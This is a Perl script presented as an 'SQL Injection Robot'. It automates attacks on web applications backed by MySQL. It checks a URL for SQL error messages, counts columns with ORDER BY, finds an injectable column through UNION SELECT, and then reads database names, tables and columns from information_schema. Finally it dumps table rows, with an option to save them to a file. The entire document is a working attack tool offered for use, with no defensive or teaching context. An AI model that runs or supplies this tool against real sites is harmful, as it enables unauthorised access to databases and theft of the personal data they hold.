#!/usr/bin/perl -w
$VersionNumber = '1.1.0';
$headerTxt = "\n\t   IN THE NAME OF GOD\n\tMR.SE SQL Injection Robot\n\t\tV $VersionNumber\n\n=============================================\n\n";
use LWP::UserAgent;
system $^O eq 'MSWin32' ? 'cls' : 'clear';
print $headerTxt;
print "Please Enter URL : (EX http://exm.com/?id=1) \n\n";

$url = <STDIN>;
@url = split('',$url);
$url[$#url] = '';
$url = join('',@url);

# Number Hexadecimal
sub hexad
{
	@ar = split('',$_[0]);
	$string = '';
	for(my $rt = 0;$rt <= $#ar; $rt ++)
	{
		$num = $ar[$rt];
		$num = 30 + $ar[$rt];
		$string .= $num;
	}
	return $string;
}
$browser = LWP::UserAgent->new;
$response = $browser->get($url . "'");
print $url . "'\n";
if($response->content =~ /<b>Warning<\/b>:  m/ || $response->content =~ /You have an error in your SQL/)
{print 'Site Have SQLi Bug . . .' . "\n\n";}
else
{print 'Site Don\'t Have SQLi Bug . . .';exit();}
for($i = 1;1;$i ++)
{
	print " + " . $url . "+order+by+" . $i . '--' . "\n";
	$response = $browser->get($url . "+order+by+" . $i . '--');
	if( $response->content =~ /<b>Warning<\/b>:  mysql/ || $response->content =~ /You have an error in your SQL/ || $response->content =~ /' in 'order clause'/)
	{
		$i = $i - 1;
		print " -   :   Columns = " . $i . "\n\n";
		goto a;
	}
}
a:
$nurl = $url . '+and+1=2+union+select+';
for($z = 1;$z <= $i;$z++)
{
	if($z == $i){
	$nurl .= '0x4841434b434f4c554d4e3a' . hexad($z);}
	else{
	$nurl .= '0x4841434b434f4c554d4e3a' . hexad($z) . ",";}
}
$nurl .= '--';
print $nurl . "\n\n";
$response = $browser->get($nurl);
$column = 0;
for($z = 1;$z <= $i;$z++)
{
	if($response->content =~ /HACKCOLUMN:$z/)
	{print "Column $z is Injectable!\n";$column = $z}
	else
	{print "Column $z is'nt Injectable!\n";}
}
if($column == 0)
{print "\nInjectable Column Not Found!"; exit();}
else
{print "\nSelected Column For Injecting is " . $column . "\n\n";}

########################################
# command ( ' Terminal ' ) ;

sub command{
	$nurl = $url . '+and+1=2+union+select+';
	for($z = 1;$z <= $i;$z++)
	{
		if($z == $column)
		{
			if($z == $i){
			$nurl .= 'group_concat(0x4841434b434f4c554d4e3a,' . $_[0] . ',0x4841434b434f4c554d4e3a)';}
			else{
			$nurl .= 'group_concat(0x4841434b434f4c554d4e3a,' . $_[0] . ',0x4841434b434f4c554d4e3a)' . ",";}
		}
		else
		{
			if($z == $i){
			$nurl .= $z;}
			else{
			$nurl .= $z . ",";}
		}

	}
	$nurl .= '+' . $_[1] . '--';
	$response = $browser->get($nurl);
	@datastring = split('HACKCOLUMN:',$response->content);
	return $datastring = $datastring[1];
}
sub ascii_to_hex
{
  my $s = shift;
  return unpack("H*",  $s);
}
########################################
print "\n=============================================\n\n";
@server = split('::',command('DATABASE(),0x3a3a,VERSION(),0x3a3a,USER(),0x3a3a',''));
print "  Current Database Name : " . $server[0] . "\n  Database Version : " . $server[1] . "\n  Username / Host : " . $server[2] . "\n\n";
$database = $server[0];
EXIT:
print "Please Press a Key To Continue . . . ";
<STDIN>;
while(1)
{
	system $^O eq 'MSWin32' ? 'cls' : 'clear';
	print $headerTxt . "Attaked Site on $database\n\n\t+----------------------+\n\t|       Database       |\n\t+----------------------+\n";
	command('schema_name','from+information_schema.schemata');
	@datastring[0] = '';
	@datastring[$#datastring] = '';
	@databases = ();
	for($x = 1;$x < $#datastring;$x += 2)
	{
		$numberTMP = ($x - 1)/2;
		print "\t|  [" . $numberTMP . "] " . $datastring[$x] . "\n";
		push(@databases,$datastring[$x]);
	}
	print "\t+----------------------+\n\n[ exit -> Close Programme ]\nPlease Enter Database ID : ";
	$db = <STDIN>;
	if($db =~ /exit/)
	{last EXIT;}
	$db = $databases[$db];
	# print $db;
	print "\n\n\t+----------------------+\n\t|        Tables        |\n\t+----------------------+\n";
	command('table_name','from+information_schema.tables+where+TABLE_SCHEMA=0x' . ascii_to_hex($db));
	@datastring[0] = '';
	@datastring[$#datastring] = '';
	@databases = ();
	for($x = 1;$x < $#datastring;$x += 2)
	{
		$numberTMP = ($x - 1)/2;
		print "\t|  [" . $numberTMP . "] " . $datastring[$x] . "\n";
		push(@databases,$datastring[$x]);
	}
	print "\t+----------------------+\n\n[ exit -> Close Programme ]\nPlease Enter Table ID : ";
	$table = <STDIN>;
	if($table =~ /exit/)
	{last EXIT;}
	$table = $databases[$table];
	
	print "\n\n\t+----------------------+\n\t|        Columns       |\n\t+----------------------+\n";
	command('column_name','from+information_schema.columns+where+table_name=0x' . ascii_to_hex($table));
	@datastring[0] = '';
	@datastring[$#datastring] = '';
	@databases = ();
	for($x = 1;$x < $#datastring;$x += 2)
	{
		$numberTMP = ($x - 1)/2;
		print "\t|  [" . $numberTMP . "] " . $datastring[$x] . "\n";
		push(@databases,$datastring[$x]);
	}
	print"\t+----------------------+\n\n Are You Want To Get Rows? [Y/N] ";
	$save = <STDIN>;
	if($save =~ /y/)
	{
		print "\n Are You Want To Save Results In FIle? [Y/N] ";
		$save = <STDIN>;
		$FILEOPEN = 0;
		if($save =~ /y/)
		{
			print "\nPlese Enter File Name EX sqli.txt : ";
			$save = <STDIN>;
			if($save ne '' && $save ne "\n")
			{
				$FILEOPEN = 1;
				open(OUTPUT,">$save");
			}
		}
		print "\n=============================================\n\n";
		if($FILEOPEN == 1){print OUTPUT join ',' , @databases . "\n\n\n";}
		print join ',' , @databases;
		print "\n\n\n";
		# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
		$STR = join ',0x3a3a,' , @databases;
		command($STR,"from+$db.$table");
		@datastring;
		@datastring[0] = '';
		@datastring[$#datastring] = '';
		@databases = ();
		for($x = 1;$x < $#datastring;$x += 2)
		{
			@SPLIT = split('::',$datastring[$x]);
			$SPLIT = join  ',' ,@SPLIT;
			if($FILEOPEN == 1){print OUTPUT $SPLIT . "\n\n";}
			print $SPLIT . "\n\n";
		}
		# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
		if($FILEOPEN == 1)
		{close OUTPUT1;}
		<STDIN>;
	}
}
print "\n\n\tGood Bye Master . . . \n";
<STDIN>;
